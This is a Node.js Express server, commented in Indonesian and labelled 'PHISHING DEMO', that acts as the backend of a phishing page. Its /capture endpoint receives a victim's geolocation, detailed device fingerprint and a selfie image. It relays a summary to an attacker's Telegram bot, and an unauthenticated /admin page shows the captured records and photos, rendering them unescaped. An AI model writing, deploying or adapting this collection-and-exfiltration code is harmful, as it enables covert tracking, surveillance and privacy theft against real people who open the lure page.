const express = require('express');
const app = express();
const PORT = 3000;

// Middleware untuk parsing JSON dengan limit besar (foto base64)
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public')); // menyajikan frontend (folder public)

// Untuk menyimpan data sementara (akan hilang jika server restart)
let capturedData = [];

// Endpoint untuk menerima data dari frontend
app.post('/capture', async (req, res) => {
    console.log('📥 Data diterima dari frontend');

    // Ambil kredensial Telegram dari environment variable
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
        console.error('❌ TELEGRAM_BOT_TOKEN atau TELEGRAM_CHAT_ID belum diset');
        return res.status(500).json({ error: 'Server configuration error' });
    }

    const data = req.body;
    if (!data) {
        return res.status(400).json({ error: 'No data received' });
    }

    // Simpan data ke array (untuk admin)
    capturedData.push({
        timestamp: new Date().toISOString(),
        ...data
    });

    // Bangun pesan teks yang akan dikirim ke Telegram
    let message = `🔥 *PHISHING DEMO - DATA BARU* 🔥\n\n`;
    message += `📅 *Waktu:* ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n`;

    // Lokasi
    if (data.location) {
        message += `📍 *Lokasi:* ${data.location.lat}, ${data.location.lng}\n`;
        message += `   Akurasi: ${data.location.accuracy || '?'}m\n`;
    } else {
        message += `📍 *Lokasi:* Tidak diberikan\n`;
    }

    // Fingerprint
    if (data.fingerprint) {
        const fp = data.fingerprint;
        message += `\n🖥️ *Perangkat:* ${fp.platform || 'N/A'}\n`;
        message += `   Layar: ${fp.screen || 'N/A'}\n`;
        message += `   Timezone: ${fp.timezone || 'N/A'}\n`;
        message += `   Bahasa: ${fp.language || 'N/A'}\n`;
        message += `   Cookies: ${fp.cookiesEnabled ? '✅' : '❌'}\n`;
        message += `   CPU Cores: ${fp.hardwareConcurrency || 'N/A'}\n`;
        message += `   Memori: ${fp.deviceMemory || '?'} GB\n`;
        if (fp.battery) {
            message += `   Baterai: ${fp.battery.level}${fp.battery.charging ? ' (charging)' : ''}\n`;
        }
        if (fp.connection) {
            message += `   Koneksi: ${fp.connection.effectiveType} (${fp.connection.downlink} Mbps)\n`;
        }
        message += `\n📱 *User Agent:*\n${fp.userAgent || 'N/A'}\n`;
    }

    // Status foto
    if (data.photo) {
        const size = Math.round(data.photo.length / 1024);
        message += `\n📸 *Selfie:* Berhasil diambil (${size} KB)\n`;
    } else {
        message += `\n📸 *Selfie:* Gagal / tidak diberikan\n`;
    }

    // Error yang dikumpulkan frontend
    if (data.errors && data.errors.length) {
        message += `\n⚠️ *Error:* ${data.errors.join(', ')}\n`;
    }

    // Kirim ke Telegram
    try {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) {
            const errText = await response.text();
            console.error('❌ Telegram error:', response.status, errText);
            return res.status(500).json({ error: 'Telegram send failed' });
        }

        console.log('✅ Pesan terkirim ke Telegram');
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Exception saat kirim ke Telegram:', error);
        res.status(500).json({ error: error.message });
    }
});

// Endpoint admin untuk melihat data yang sudah terkumpul
app.get('/admin', (req, res) => {
    let html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin Dashboard - Phishing Demo</title>
        <style>
            body { font-family: 'Segoe UI', Arial; background: #111; color: #eee; margin: 20px; }
            h1 { color: #ffd700; }
            table { border-collapse: collapse; width: 100%; background: #222; border-radius: 8px; overflow: hidden; }
            th { background: #333; color: #ffd700; padding: 12px; text-align: left; }
            td { padding: 10px; border-bottom: 1px solid #444; }
            img { max-width: 150px; max-height: 120px; border-radius: 4px; }
            .timestamp { font-size: 0.9em; color: #aaa; }
            .location { font-family: monospace; }
        </style>
    </head>
    <body>
        <h1>📊 Captured Data (${capturedData.length})</h1>
        <table>
            <tr>
                <th>Waktu</th>
                <th>Lokasi</th>
                <th>Perangkat</th>
                <th>Foto</th>
            </tr>
    `;

    capturedData.slice().reverse().forEach(d => {
        html += `<tr>
            <td class="timestamp">${d.timestamp || 'N/A'}</td>
            <td class="location">${d.location ? `${d.location.lat}, ${d.location.lng}<br><small>akurasi ${d.location.accuracy}m</small>` : 'N/A'}</td>
            <td>${d.fingerprint ? `${d.fingerprint.platform || ''}<br>${d.fingerprint.screen || ''}` : 'N/A'}</td>
            <td>${d.photo ? `<img src="${d.photo}" />` : 'Tidak ada foto'}</td>
        </tr>`;
    });

    html += `</table>
    <p style="margin-top:20px; color:#666;">Data hanya disimpan sementara di memori.</p>
    </body>
    </html>`;
    res.send(html);
});

// Endpoint untuk cek kesehatan
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
    console.log(`🚀 Server berjalan di http://localhost:${PORT}`);
    console.log(`📋 Admin dashboard: http://localhost:${PORT}/admin`);
});